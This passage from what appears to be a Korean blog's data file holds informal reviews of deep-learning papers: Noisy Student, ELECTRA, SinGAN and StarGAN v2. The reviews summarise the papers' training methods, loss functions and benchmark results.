리뷰하게 됐어요.\r\n\r\n아래는 이번 approach 가 달성한 성능인데, 이전 SOTA 에 비해서 Accuracy 가 약 2% 정도 올라갔네요.\r\n\r\n해당 이미지에는 *L2* performance 가 안올라와 있는데, *Noisy Student + Random Augment* 로 훈련한 *L2* 모델 top-1 accuracy 가 *88.4%* 입니다.\r\n올해에는 90% 가 넘는 architecture 가 나오지 않을까 생각이 드네요.\r\n\r\n![img](performance.png)\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/1911.04252.pdf)\r\n\r\ncode : [code](https://github.com/tensorflow/tpu/tree/master/models/official/efficientnet)\r\n\r\n## Related Work\r\n\r\nEfficientNet : [arXiv](https://arxiv.org/pdf/1905.11946.pdf)\r\n\r\n## Introduction\r\n\r\n이전 Image Classification 연구 동향들에서도 간단하게 설명은 다음에 다른 포스트로 다뤄볼께요. 양이 좀 많이 질 듯 해서 (~~귀찮네요~~)\r\n\r\n## Architecture\r\n\r\n### Self-Training w/ Noisy Student\r\n\r\n학습은 다음과 같은 process 로 이뤄지는데,\r\n\r\n![img](teacher-student.png)\r\n\r\n1. Labelled dataset 인 ImageNet 으로 **Teacher Model** 을 학습\r\n2. un-labelled dataset 인 JFT-300M 를 **Teacher Model** 로 pseudo labelling 하기\r\n3. `2` 에서 생성된 data + ImageNet 으로 **Student Model** 학습 w/ noise\r\n4.  다시 `2` 으로 가서 반복 (iterative training)\r\n\r\n위 과정이 knowledge (self) distillation 과 비슷한 과정인데, 주로 요 목적은 compression 으로 사용되는데, 여기는 \r\n해당 목적 (not compression) 으로 사용하지 않는다는게 차이점 입니다.\r\n\r\n### Training\r\n\r\n데이터 셋이나 구체적인 training recipe 들이 있지만, 적용한 technique 가 있어서 이걸 설명 해 보면,\r\n\r\n#### fix train-test resolution discrepancy\r\n\r\n처음 몇 epoch 은 low resolution image 로 훈련을 하고 후에 high resolution image 로 fine-tuning 하는 기법입니다.\r\n\r\n논문 실험에서는 처음 350 epochs 는 낮은 해상도 이미지로 훈련하고, 1.5 epochs 는 더 큰 해상도로 unlabelled image 에 대해서 훈련했다고 하네요.\r\n\r\nunlabelled image data 는 학습할 때 labelled image 보다 14 배 큰 batch size 를 사용했다고도 하네요.\r\n\r\n#### Iterative Training\r\n\r\n논문에서는 총 3 steps 의 iterative training 을 했다고 소개합니다.\r\n\r\n1. `EfficientNet-b7` 을 ImageNet 으로 훈련 `(as Teacher)`\r\n2. `EfficientNet-L2` 를 JFT-300M + ImageNet 으로 훈련 `(as Student)` (batch size 비율은 labelled : unlabelled = 1 : 14)\r\n3. `EfficientNet-L2` 를 새롭게 훈련 `2` 에서 만든 모델을 `Teacher` 로 사용 `(as Student)`\r\n4. `3` 과 비슷한 scheme 으로 진행하는데, (batch size 비율은 labelled : unlabelled = 1 : 28) 로 훈련\r\n\r\n#### Noisy\r\n\r\nStudent Model 을 학습할 때 논문에서 `Noisy` 하게 훈련한다고 했는데, 이 때 `Noisy` 에 해당하는 부분은 크게 3 부분 입니다.\r\n\r\n1. Data Augmentation w/ RandAugment\r\n2. Dropout\r\n3. Stochastic Depth\r\n4. other techniques (data filtering, balancing)\r\n  * OOD (Out-Of-Distribution)\r\n  * unlabelled data 에 대해선 class 별 samples 수가 biased 돼있으니, 적은 sample 들 duplicate 하기\r\n  * pseudo label 시, soft or hard pseudo 한다고 했었는데, soft, hard 둘다 좋은 결과를 보였지만, soft 가 더 좋았다\r\n\r\n요런 기법들은 이전에 소개된 기법들이니 설명은 pass\r\n\r\n## Experiment Result\r\n\r\n### ImageNet Benchmark\r\n\r\n역대 ImageNet architecture 들 정확도를 benchmark 한 table 인데, 다른 구조보다 \r\n\r\n1. 더 적은 params 수\r\n2. 상대적으로 적은 extra data 수\r\n3. 더 높은 성능\r\n\r\n을 달성했다는 점에서 의미가 있을 것 같네요.\r\n\r\n![img](overall-imagenet-performance.png)\r\n\r\n### Robustness Results on ImageNet-A, ImageNetC and ImageNet-P\r\n\r\n해당 dataset 은 이 모델이 정말로 noise 에 robust 한지 체크하는 task 입니다.\r\n\r\n예를 들어서, (일반적인 corruptions, perturbations)\r\n\r\n1. blur 섞인 이미지\r\n2. fogged 이미지\r\n3. rotated 이미지 \r\n4. scaled 이미지\r\n\r\n등등이 데이터에 섞여 있어요.\r\n\r\n![img](imagenet-a-benchmark.png)\r\n\r\nImageNet-A dataset benchmark table 만 하나 보면, 확실히 `The Noise` 가 robustness 에 큰 도움을 주고 있네요.\r\n\r\n### Adversarial Robustness\r\n\r\n이번 실험은 adversarial attack 에도 robust 한지 확인하는 겁니다. 주로 FGSM Attack 을 해서 테스트를 하는데, 성능은 아래와 같습니다.\r\n\r\n![img](fgsm-benchmark.png)\r\n\r\nFGSM 보다 더 강력한 attack 인 FGD Attack 시에도 꽤괜 성능을 보였다고 캅니다.\r\n\r\n## Conclusion\r\n\r\n요즘 경향들은 이전처럼 deep 한 architecture 를 설계하거나 AutoML 을 이용한 NAS 를 만드는 것 보다는,\r\ntraining recipe (~ techniques) 에 집중을 하고 있는데, 이런 trend 에서 재미있는 approach 들이 많이 나오고 있는 것 같네요.\r\n\r\n또 현재 상태에서 CutMix 등등 여러 또 다른 기술들이 적용되면 최고 performance 가 어느 정도 될지도 궁금해 지네요.\r\n\r\n결론 : 굳\r\n","excerpt":"TL;DR 이번 포스팅에서 리뷰할 논문은 EfficientNet 기반으로 새로운 techniques 를 적용해서 ImageNet dataset 에서 SOTA 를 찍은 논문입니다.\n나온지는 꽤 됐지만, 최근 TPU 에서 돌아가는 요 코드를 짜다가 생각…","fields":{"slug":"/Noisy-Student/"},"frontmatter":{"date":"Apr 11, 2020","title":"Self-training with Noisy Student improves ImageNet classification","tags":["Deep-Learning"],"update":"Apr 11, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번에 리뷰할 논문은 *ELECTRA* 란 google ai 에서 3월에 발표한 논문인데, 재밌는 approach 를 하고 있어서 가져와 봤습니다.\r\n\r\nELECTRA paper : [OpenReview](https://openreview.net/pdf?id=r1xMH1BtvB)\r\n\r\ngoogle ai blog : [blog](https://ai.googleblog.com/2020/03/more-efficient-nlp-model-pre-training.html)\r\n\r\n## Related Work\r\n\r\n이전 trend 들 5 개 정도만...\r\n\r\nBERT : [paper](https://arxiv.org/pdf/1810.04805.pdf)\r\n\r\nXLNET : [paper](https://arxiv.org/pdf/1906.08237.pdf)\r\n\r\nRoBERTa : [paper](https://arxiv.org/pdf/1907.11692.pdf)\r\n\r\nALBERT : [paper](https://arxiv.org/pdf/1909.11942.pdf)\r\n\r\nT5 : [paper](https://arxiv.org/pdf/1910.10683.pdf)\r\n\r\n## Introduction\r\n\r\n간단하게 이번 *ELECTRA* paper 에서 이전과 다른 점 3 가지를 정리하면\r\n\r\n1. input 을 masking 하는게 아닌 generator 로 token 생성 (masking 효과)\r\n\r\n2. token ID 를 예측하는 게 아닌 discriminator 로 각 token 이 generated 됐는지 예측\r\n\r\n3. 기존 MLM 보다 더 좋음. (small MLM, ...)\r\n\r\n## Architecture\r\n\r\n### Previous Story\r\n\r\n이전 LM 들을 보면 DAE 형태로 학습을 하고 (masked input 을 복원), *BERT* 같은 경우에는 masking 때문에 example 당 token 의 15% 밖에 학습이 안돼서\r\n학습 비용이 꽤 컸어요.\r\n\r\n그래서 위 문제를 해결하려고 *ELECTRA*에서 replaced token detection task 를 제안했는데, \r\nmasking 하는 대신, 작은 MLM (masked language model ~ generator) 으로 생성된 output 으로 일부 교체 하고 discriminator 를 둬서 이게 replaced token or not 인지를 예측하게 학습했습니다.\r\n\r\n장점 으로는\r\n* MLM 자제가 작은걸 사용 -> 연산이 더 빨라짐\r\n* masked 된 부분만이 아닌 전체 token 에 대해서 discriminate -> 학습 효율 증가\r\n\r\n![img](disc_gen_overview.png)\r\n\r\n### Method\r\n\r\ngenerator / discriminator 로 GAN 과 유사해 보이는데, 해당 network 구조만 그렇고\r\n실제로 *adversarial* 하게 훈련하지는 않습니다.\r\n\r\n각 network encoder 는 transformer 로 구성되어있고,\r\n\r\ngenerator 는 각 token 에 대한 softmax 값을 output 로 주고\r\n\r\n> $p_G(x_t\\|x) = exp(e(x_t)^T h_G(x)_t) / \\sum_{\\dot{x}} exp(e(\\dot{x})^T h_G(x)_t$\r\n\r\ndiscriminator 는 각 token 에 대해 replaced / not replaced 를 예측합니다.\r\n\r\n> $D(x, t) = sigmoid(w^T h_D(x)_t)$\r\n\r\n### Model Extensions\r\n\r\n#### Weight Sharing\r\n\r\n* generator 하고 discriminator 크기가 같으면 weight sharing \r\n* 그런데 실험 결과로는 크기가 같지 않고 small generator 를 사용하는게 훨 좋았음\r\n* 그래서 small generator 를 사용하는 경우엔 token embedding table 만 weight sharing 을 함\r\n\r\n#### Small Generators (MLM)\r\n\r\n* generator / discriminator 크기가 같으면 기존 MLM 보다 2 배 커짐\r\n* 주로 generator 가 discriminator 크기의 x0.25 ~ x0.5 일 때 괜춘함\r\n* 간단한 uni-gram generator 도 시도를 해봄\r\n* adversarial 하게 훈련하는 건 discriminator 에게 꽤 challenging 한 일이여서, 실제 실험결과도 성능이 덜 좋음\r\n\r\n#### Training Algorithms\r\n\r\n1. 처음 n steps 는 generator 만 훈련\r\n2. generator weight 로 discriminator 초기화 -> generator freezing 후 discriminator 만 훈련\r\n\r\n### Small Models\r\n\r\n효과적으로 훈련하려고 아래와 같은 hyper-parameters 사용\r\n\r\n1. sequence length (512 -> 128)\r\n2. batch size (256 -> 128)\r\n3. hidden dims (768 -> 256)\r\n4. token embedding (768 -> 128)\r\n\r\n아래 Exp Result 에 결과첨부\r\n\r\n### Large Models\r\n\r\nBERT-large 와 똑같은 size, 하지만 training time 은 더 오래걸림.\r\n\r\nbatch size 는 2048, XLNET pre-training data 도 사용했다고 하네요. (RoBERTa 훈련할 때 사용한 데이터와 비슷)\r\n\r\n### Efficiency Analysis\r\n\r\n크게 3 가지인데\r\n\r\n1. ELECTRA 15% : discriminator loss 를 전체 token 이 아니라 masking 된 15% 에만 계산\r\n\r\n2. Replace MLM : 마스킹 할 token 을 `[MASK]` token 으로 replace 함\r\n\r\n3. All-Token MLM : 위에서 masking 된 token 을 predict, discriminator 에선 mask 에 대해서만 예측이 아닌 모든 token 에 대해 예측\r\n\r\n## Experiment Result\r\n\r\n### small models on the GLUE dev set\r\n\r\n![img](small_models_glue_dev_set.png)\r\n\r\n가성비 굳!\r\n\r\n### SQuAD\r\n\r\n![img](squad_benchmark.png)\r\n\r\n### Efficiency\r\n\r\n![img](efficiency_exp_glue_score.png)\r\n\r\n## Conclusion\r\n\r\n결론 : 굳\r\n","excerpt":"TL;DR 이번에 리뷰할 논문은 ELECTRA 란 google ai 에서 3월에 발표한 논문인데, 재밌는 approach 를 하고 있어서 가져와 봤습니다. ELECTRA paper : OpenReview google ai blog : blog Rel…","fields":{"slug":"/ELECTRA/"},"frontmatter":{"date":"Apr 11, 2020","title":"ELECTRA Pre-training Text Encoders as Discriminators Rather Than Generators","tags":["Deep-Learning"],"update":"Apr 11, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번 포스팅에서는 ICCV 2019 에서 [Best Paper Awards](https://syncedreview.com/2019/10/29/iccv-2019-best-papers-announced/) 에서 선정된 papers 중에 하나인 **SinGAN** 을 리뷰해 보겠습니다.\r\n\r\n개인적으로 정말 재밌게 본 논문이고, ICCV 2019 논문들 중 최고였던거 같아요. 그래서 저도 간략한 overview 와 technical review 를 해 보려고 합니다.\r\n\r\n소개 전에 간단하게 SinGAN 으로 뭘 할 수 있는지 보면, **단 한 장의 이미지로 realistic 한 image manipulation 들을 생성**할 수 있어요.\r\n\r\n![img](teaser.png)\r\n\r\n![img](manipulation.png)\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/1905.01164.pdf)\r\n\r\nofficial implementation : [code](https://github.com/tamarott/SinGAN)\r\n\r\n## Introduction\r\n\r\n기존 GAN 들을 대부분의 연구들을 보면 얼굴, 침실, 풍경 등 한 가지 종류에 focus 한 게 대부분이고, 주로 많은 데이터를 요구했습니다.\r\n\r\n다양한 종류의 object 를 생성하는 것은 여전히 잘 못하고 있고, 이런 문제를 해결할려고 conditional 하게 생성을 하거나 (e.g. cGAN), task 를 특정하는 등의 방법으로 문제를 해결하려 했습니다.\r\n\r\n왜냐면 이전 방법들로는 적은 수의 데이터와 여러 종류의 데이터의 distribution 을 잘 학습하기엔 엄청 어려웠어요\r\n\r\n그럼 이런 문제들을 어떻게 하면 해결할 수 있을까에서,\r\n\r\n> '단 1 장'의 이미지로 GAN 을 훈련할 수 있을까??\r\n\r\n이런 이번 논문인 **SinGAN** 이란 concept 이 나오게 됐습니다. (멋지죠?)\r\n\r\n물론 이전에 이런 노력을 안한건 아니에요. 정확히 논문 이름들은 기억이 안나는데, 대부분이 input 에 대해서 conditional 한 method 를 사용하고 있었습니다.\r\n\r\n또한 이전에 Unconditional Single Image GAN 이라고 하면 Texture Generation 이란 task 로 유일하게 문제를 풀고 있었는데, 이 task 의 한계는\r\ntexture image 에 대해선 결과가 reasonable 한데, non-texture image 에 대해서는 별로 였어요.\r\n\r\n하지만 이번에 소개할 논문에서는 \r\n\r\n* unconditional 하게, noise 로 부터 image 생성\r\n* general purpose 로 natural image target (non-texture) 에도 적용 가능한 방법 제안\r\n\r\n합니다.\r\n\r\n물론 결과는 이전 method 들 보다 훨씬 general 하고 결과도 outperform 합니다!\r\n\r\n## Technical Review\r\n\r\n**SinGAN** 에 소개된 novelty 를 1 가지로 요약 해 보면 아래와 같아요\r\n\r\n**Multi-Scale Architecture (# 2.1)**\r\n\r\n완전 새로운 concept 는 아니고, multi-scale architecture 에 대해서는 이전에 LAPGAN 이란 GAN 에서 한 번 비슷하게 소개가 되었는데,\r\n궁금하시면 한번 봐도 좋을 것 같습니다.\r\n\r\n### Multi Scale Architecture\r\n\r\nSinGAN 의 ultimate goal 이라고 하면, single image 의 internal distribution 을 잘 배우는 unconditional generative model 를 만드는 겁니다.\r\n\r\n이런 것을 하려면 다음과 같은 것들을 잘 해야 할텐데,\r\n\r\n* many different scales 로 복잡한 image structure 의 distribution 을 capture 하기\r\n    * global properties : 이미지 내 큰 objects 들의 모양과 배열 e.g.) 하늘 위치, 땅 위치\r\n    * local properties : global properties 의 details \r\n\r\n그래서 multi-scale architecture 를 선택했습니다.\r\n\r\n![img](multi-scale-architecture.png)\r\n\r\n위 그림에서 x_0 가 original training image 이고, x_1 ~ x_N 가 x_0 에서 r 배 (r > 1) 씩 down-sampled image 입니다.\r\n\r\n각 scale 에서...\r\n\r\n#### Generator\r\n\r\nnoise (z_n) 와 이전 단계에서 생성된 image (~x_n-1) 를 받아서 image (~x_n) 을 만듭니다.\r\n\r\n#### Discriminator\r\n\r\nreal image 와 (x_n) fake image (~x_n) 를 구분.\r\n\r\n하나 차이(?)점이 있다면, 맨 아래 scale stage 에서는 only noise (z_N) 를 사용해서 image 를 생성합니다.\r\n\r\n논문에서 coarse-to-fine fashion 이라고 소개를 하는데, 좀 쉽게 설명 해 보면,\r\n\r\n아래 단계에서는 down-sampled image 를 학습하니, 상대적으로 detail 보단 global 한 feature 에 집중을 하면서 학습을 하고,\r\n위 단계일 수록 fine feature 에 더욱 집중하게 됩니다. 동일한 receptive field 에 생성하는 image scale 이 다르니,\r\n위 그림에 **Effective Patch Size** 가 달라지면서 coarse-to-fine fashion 으로 학습이 된다 입니다.\r\n\r\n#### Single Scale Generation\r\n\r\n각 G_N 부분에 해당되는 block 인데, 구조는 아래와 같습니다.\r\n\r\n![img](single-scale-generation.png)\r\n\r\n% 이전 stage 에서 up-sampled image : x_n+1\r\n\r\n1. z_n + x_n+1 가 conv 연산을 통과\r\n2. x_n+1 가 residual 하게 마지막에 연결\r\n\r\n가 간단한 구조인데, conv block 부분을 더 자세하게 설명하면,\r\n\r\n``` Conv (3x3) - BatchNorm - LeakyReLU ``` \r\n\r\n이 convention 으로 5 층을 쌓았네요.\r\n\r\n처음 (coarsest scale) 엔 32 kernels / block 으로 시작을 하고 4 scales 마다 kernel 을 2 배 늘려 주었다고 합니다.\r\n\r\n이렇게 해 준 이유는 (상대적으로 light 한 구조여서), \r\n\r\n주로 generator 의 capacity 가 커지면 training image 를 외어버리는 경우가 생기는데, 이를 방지하려고 light 하게 설계를 한 것 같습니다.\r\n\r\n또한 fully-convolutional 하게 설계를 한 이유는, arbitrary image size 에도 training / inference 가 가능하게끔 하려고 라고 설명을 합니다.\r\n\r\n### GAN training\r\n\r\n이 부분이 이제 GAN을 학습하는데 있어서 제일 중요한 부분인데, 딱히 특별한 부분은 없습니다.\r\n\r\n#### loss function\r\n\r\nloss 는 adversarial loss + reconstruction loss 로 이뤄졌고\r\n\r\n```python\r\ntotal_loss = adv_loss + alpha * rec_loss\r\n```\r\n\r\n##### Adversarial loss\r\n\r\nWGAN-GP loss 사용 했고. 논문에 보면, 다른 texture single image GAN 과 다르게, patch 별이 아닌 전체 이미지에 대한 \r\nloss 를 사용했더니 네트워크가 boundary conditions (SM) 를 학습할 수 있었다고 합니다.\r\n\r\n#### Reconstruction loss\r\n\r\nl2 loss 를 사용. 각 stage 에서의 rec loss 를 다음과 같이 정의가 가능한데,\r\n```python\r\nrec_loss_n = l2_loss(G_n(0, (~x_n+1)), x_n)\r\n```\r\n또한 ~x_n 의 역할이 하나 더 있는데, stage n 에서의 noise z_n 에 대한 std 값을 결정하는데 쓰여요.\r\n~x_n+1 하고 x_n 의 RMSE 값을 구해서 각 scale 에 얼마만큼 더해야 하는지를 알려주는 정도로 사용된다고 합니다.\r\n\r\n또 중요한 부분은 noise 를 넣어줄 때, 첫 단계에만 fixed noise 로 넣어주고 다른 단계에서는 noise 를 따로 만들어 주지 않았는데,\r\nimage pixel difference 를 줄이려는 것에 focus 를 하려고 이렇게 했다고 캅니다.\r\n\r\n## Experiment Result\r\n\r\n### 정량적인\r\n\r\n총 2 가지의 정략적인 방법을 사용했는데,\r\n\r\n1. Amazon Mechanical Turk (AMT) \r\n2. Single Image Frechet Inception Distance (SIFID)\r\n\r\n요즘 GAN paper 들에서 자주 사용하는 metric 들입니다.\r\n\r\n#### AMT\r\n\r\nAMT 는 사람들에게 직접 답을 하게 해서 결과를 매기는 서비스입니다.\r\n여기서는 해당 이미지가 Fake 인지 Real 인지를 구별하게 하는 투표 방식을 사용했습니다.\r\n\r\n여기선 2 가지 방식으로 조사를 하였는데,\r\n\r\n1. 실제 이미지와 SinGAN 이 생성한 이미지를 보여주고 어느 쪽이 가짜인지 맞히는 Paired 실험\r\n2. 둘 중 하나만 보여주고 얼마나 헷갈렸는지를 물어보는 Unpaired 실험\r\n\r\n실험 조건은, 각 실험 당 1 초의 시간에 1 명당 50 장의 image 를 보여주었답니다.\r\n\r\n생성한 이미지는 stage N, N - 1 에서 생성한 이미지들을 주었다는데, (논문에선 N -2 까지)\r\n* stage N 은 noise 로 부터 생성한 이미지고\r\n* stage N - 1 은 진짜 이미지를 축소해서 G_N-1 에 넣어주는 방식인\r\n\r\n이런 실험에선 노이즈로 부터 생성할 때와 진짜 이미지 기반으로 생성할 때의 차이를 볼 수 있는데,\r\n\r\n![img](generate_from_different_scales.png)\r\n\r\n실험 결과를 보면, stage N, 노이즈로 부터 생성한 것은 원본과는 많이 다른 결과를 가져올 수 있고,\r\nstage N - 1, N - 2 는 원본 형태 유지는 되고, N - 2 같은 경우엔 texture 가 더 원본 같다는 것도 확인 할 수 있습니다.\r\n\r\n하지만, 원본 object 의 배열을 유지한 상태에서 다양성을 보장하기엔 stage N - 1 결과물이 제일 좋다고 판단이 가능하네요.\r\nAMT perceptual study 결과도 N - 1 stage 일 때가 가장 좋습니다.\r\n\r\n재밌는 점은 stage N - 1 일 때, **confusion 이 47 %** 인데, 사람이 보기에도 정말 헷갈리나 보네요.\r\n\r\n#### SIFID\r\n\r\n기존 FID 를 Single Image 에 맞게 변형해서 SIFID metric 을 제안해서 사용합니다.\r\n\r\n각 scale 별 SIFID 를 측정하고 AMT 에서 Survey 한 결과하고 (Paired, UnPaired) correlation 를 측정해서 유의미한 metric 임을 증명하네요.\r\n\r\n요 부분은 논문 6 ~ 7 페이지에 나와있는데, 여길 참고하세용 (~~귀찮아~~)\r\n\r\n### 정성적인\r\n\r\n총 5 개의 application 예시를 보여주고 있는데,\r\n\r\n#### Single Image Super Resolution (SISR)\r\n\r\n결과 비교를 위해 \r\ninternal method 인 Deep Image Prior (DIP), Zero-Shot Super Resolution (ZSSR)\r\nexternal method 인 SRGAN, EDSR 와 결과를 비교했습니다.\r\n\r\n![img](sisr_result.png)\r\n\r\n(distortion quality 인 RMSE 가 낮을 수록 좋고, Perceptual Quality 인 NIQE 가 높을 수록 좋음)\r\n\r\n다른 Internal Method 에 비해 RMSE 는 높지만, external method 인 SRGAN 과 NIQE 값은 comparable 합니다.\r\n\r\n1 장의 이미지만 사용해서 이 정도 결과라서 정말 신기하네. 개인적으론 PSNR 같은 다른 metric 하고 모델 들도 넣어줬으면 좋을 것 같네요.\r\n\r\n#### Paint-To-Image Style Transfer\r\nPaint Image 로 부터 생성하는 style transfer 실험인데, quality 가 꽤괜입니다.\r\n\r\n![img](paint_to_image_style_transfer_result.png)\r\n\r\n#### Editing\r\n\r\n원본 이미지에 일부 영역들을 임의의 무언가로 넣으면 이 친구가 얼마나 자연스럽게 만들어 주는지 확인 해 주는 task 인데,\r\n이것도 꽤 재밌는 결과를 보이네요.\r\n\r\n아래 이미지에서 *Content Aware Move* 가 포토샵 기능인데, 이 것보다 잘하는 거 같네요\r\n\r\n![img](editing_result.png)\r\n\r\n#### Harmonization\r\n\r\nImage 2 장을 합쳤을 때 조화롭게 잘 합쳐주는 지를 보는 task 인데, 이것도 꽤 자연스럽게 잘 되는 것 같아요\r\n\r\n![img](harmonization_result.png)\r\n\r\n#### Single Image Animation\r\n한 장의 이미지를 넣어주면 짧은 video clip 을 만들어 주는 task 인데, 이 것도 자연스럽게 잘 되는 것 같네요\r\n\r\n[video](https://www.youtube.com/watch?v=xk8bWLZk4DU&feature=youtu.be)\r\n\r\n## Conclusion\r\n\r\n이번에 SinGAN paper review 를 해 보았는데, 이미지 한 장만 사용한다는 점과 Application 들이 정말 좋았던 paper 였어요.\r\n\r\n개인적으론 network 설계나 등등 요소들은 조금 아쉽네요.\r\n","excerpt":"TL;DR 이번 포스팅에서는 ICCV 2019 에서 Best Paper Awards 에서 선정된 papers 중에 하나인 SinGAN 을 리뷰해 보겠습니다. 개인적으로 정말 재밌게 본 논문이고, ICCV 2019 논문들 중 최고였던거 같아요. 그래서…","fields":{"slug":"/SinGAN/"},"frontmatter":{"date":"Mar 14, 2020","title":"StarGAN-v2 - Diverse Image Synthesis for Multiple Domains review","tags":["Deep-Learning"],"update":"Mar 14, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번 포스팅에서는 I2I translation 를 푼 **StartGAN v2** 을 리뷰해 보겠습니다.\r\n\r\n평소에 Multi-Domain I2I translation task 에 관심이 많았는데, 작년에 나온 StarGAN 후속작인 StarGAN v2 가 나와서 한번 리뷰해 보려고 합니당\r\n\r\n아래는 StarGAN v2 demo 인데, 아래와 같은 느낌입니다.\r\n\r\n![gif](celeba_hq_teaser_video.gif)\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/1912.01865.pdf)\r\n\r\nofficial implementation : [code](https://github.com/clovaai/stargan-v2)\r\n\r\n## Related Work\r\n\r\n아래는 관련 task 논문들인데 한번 읽어 보세요!\r\n\r\n* CycleGAN : [arXiv](https://arxiv.org/pdf/1703.10593.pdf)\r\n* DiscoGAN : [arXiv](https://arxiv.org/pdf/1703.05192.pdf)\r\n* StarGAN : [arXiv](https://arxiv.org/pdf/1711.09020.pdf)\r\n* MUNIT : [arXiv](https://arxiv.org/pdf/1804.04732.pdf)\r\n* DRIT : [arXiv](https://arxiv.org/pdf/1905.01270.pdf)\r\n* MSGAN : [arXiv](https://arxiv.org/pdf/1903.05628.pdf)\r\n* RelGAN : [arXiv](https://arxiv.org/pdf/1908.07269.pdf)\r\n\r\n## Introduction\r\n\r\n기존의 여러 Multi-Domain I2I translation 연구들로 대표적으로 Pix2Pix, CycleGAN, DiscoGAN, MUNIT, StarGAN 등등이 있어요.\r\n그런데 요런 2 가지를 만족하지는 못하는 한계가 있었습니다.\r\n\r\n1. 한정된 domain 들 내에서만 translate (눈, 코, 입, 턱수염, 표정)\r\n2. 한 번에 1 가지 domain 에 대해서 translate (A->B, B->A)\r\n\r\n즉, 기존의 Multi-Domain I2I translate task 에서는 generator 에 *one-hot* or *multi-hot* attribute vector 를 input 에 합쳐주는 방식이였습니다.\r\n\r\n이번 논문에서는 이러한 한계들을 극복하고자 다음과 같은 목표를 제시했는데,\r\n\r\n1. 여러 domain 에 대해서 모두 translate 가능\r\n2. 특정 domain 에 대한 여러 가지 style 에 대해서 translate 가능\r\n\r\n요런 것들을 가능하게 합니다.\r\n\r\n## Architecture\r\n\r\n먼저 아래는 StarGAN v2 architecture 간단한 overview 인데, \r\n아래 목적을 간단하게 설명하면 *image x* 와 *image y* 가 있다면, Generator 로 *image x* 에 대응되는 *image y* 의 각 domain 의 다양한 이미지들을 생성하는 겁니다.\r\n\r\n![img](overview_of_starganv2.png)\r\n\r\n각 Network 들의 역할을 알아보면 다음과 같아요.\r\n\r\n### Generator (G)\r\n\r\n*image x* 가 입력으로 들어오고 중간에 *domain-specific style code s* vector 가 들어와서 output image 를 만듭니다.\r\n\r\n> *$output = G(x, s)$*\r\n\r\n여기서 *s* 는 *mapping network* 나 *style encoder* 에서 만들어진 *style vector* 입니다.\r\n\r\n즉, 이미지 한 장을 받고 어떤 style 을 받으면 해당 style 을 반영한 결과물 무언가를 만들어 내는 아이입니다.\r\n\r\n### Mapping Network (F)\r\n\r\n*mapping network*, *F* 는 *latent code z* 와 *domain y* 에 대해서, *style code*를 만드는 network 인데, 대충 공식은 이렇게 됩니다.\r\n\r\n> *$s = F_y(z)$*\r\n\r\n즉, *domain y* 를 represent 하는 *latent code z* 를 *style code s* 로 mapping 해 주는 역할을 합니다.\r\n\r\n*F* 는 간단한 여러 FC layers 들의 combination 인데, 모든 multiple-domains 에 해당하는 style codes 를 주기 위해서, multiple-outputs 를 가지는 구조랍니다.\r\n\r\n### Style Encoder (E)\r\n\r\n*image x* 와 *domain y*가 있다면 *E* 는 *image x* 에서 style information 을 추출하는 역할을 해요.\r\n\r\n> *$s = E_y(x)$*\r\n\r\n*E* 는 reference image 에 대해서 다양한 style code 들을 생성하는 역할을 해요. 이렇게 생성된 style code 들을 *G* 에서 이미지를 생성할 때 사용됩니다.\r\n\r\n% *E* 도 위의 *F* 와 똑같은 multi-task scheme 을 따릅니다.\r\n\r\n### Discriminator (D)\r\n\r\n*D* 도 위와 같은 scheme 으로 multi-task wise 한 구조를 가집니다. 즉, multiple output branch 를 가집니다.\r\n\r\n## Technical Review\r\n\r\n### Adversarial Loss\r\n\r\nGAN loss 같은 경우엔 WGAN, WGAN-GP, hinge-loss based gan loss 가 아닌 vanila gan loss 를 사용했네요.\r\n\r\n> $L_{adv} = E_{x,y}[log D_y(x)] + E_{x,\\tilde{y},z}[log (1 - D_{\\tilde{y}}(G(x, \\tilde{s})))]$\r\n\r\n### Style Reconstruction Loss\r\n\r\n*style code* 를 training 하기 위해서, *l1 loss* 를 사용합니다. \r\nloss 에 다른 특별한 점은 없지만 하나의 Encoder 로 multiple domains 들의 feature 를 추출한다는 게 큰 특징/차이가 되겠네요.\r\n\r\n> $L_{sty} = E_{x,\\tilde{y},z}[\\|\\tilde{s} - E_{\\tilde{y}}(G(x, \\tilde{s}))\\|_1]$\r\n\r\n### Style Diversification Loss\r\n\r\nstyle 다양성을 위해선 *diversity sensitive* 한 loss 로 generator 를 regularize 해야 한다고 합니다.\r\n\r\nrandom latent code $z_1$, $z_2$ 에서 생성 된 $s_1^~$, $s_2^~$ 들을 (굳이 수식으로 쓰면 아래와 같음)\r\n*image x* 와 *G* 로 생성한 *output* 들의 *l1 loss* 를 구합니다.\r\n\r\n> $s_{\\tilde{i}} = F_{\\tilde{y}}(z_i), i \\in {1, 2}$\r\n\r\n> $L_{ds} = E_{x,\\tilde{y},z_1,z_2}[\\|G(x, \\tilde{s_1}) - G(x, \\tilde{s_2})\\|_1]$\r\n\r\n논문에선 이 loss 의 *optimal point* 는 존재하지 않아서, *$L_{ds}$* 의 loss weight 를 0 까지 linearly decay 시킨다고 합니다.\r\n\r\n### Preserving Source Characteristics\r\n\r\n위의 loss 들만으로는 생성물이 어떤 결과물이여야 하는지를 preserve 하지 못하는데, \r\n결과물은 반드시 *domain-invariant* 한 특성을 가지고 있어야 합니다. 이걸 잘 하는게 목표니까요!\r\n\r\n이 부분을 해결하기 위해선 여러 task 에서 사용하고 있는 공식 loss 인 *cycle consistency loss* 를 쓰죠.\r\n\r\n> $L_{cyc} = E_{x,y,\\tilde{y},z}[\\|x - G(G(x, \\tilde{s}), \\hat{s})\\|_1]$\r\n>\r\n> $\\hat{s} = E_y(x)$\r\n\r\n### Total Loss\r\n\r\n총 4 가지 type 의 loss 를 사용해서 아래와 같습니다.\r\n\r\n> $L_D = - L_{adv}$\r\n>\r\n> $L_{F,G,E} = L_{adv} + \\lambda_{sty} * L_{sty} - \\lambda_{ds} * L_{ds} + \\lambda_{cyc} * L_{cyc}$\r\n\r\n전체적으로 loss 는 간편한 편이고 *zero cycle consistency loss* 나 등등의 loss 를 사용하지 않아도 *identity* 보존이나,\r\n등등을 잘 하나 봅니다\r\n\r\n## Architectures\r\n\r\n### Generator\r\n\r\n처음에 독특(?)한 scheme 으로 1x1 conv2d 를 사용 해 주고, pooling 은 average pool, up sample 은 nn interpolation 을 사용.\r\nencoder part 에는 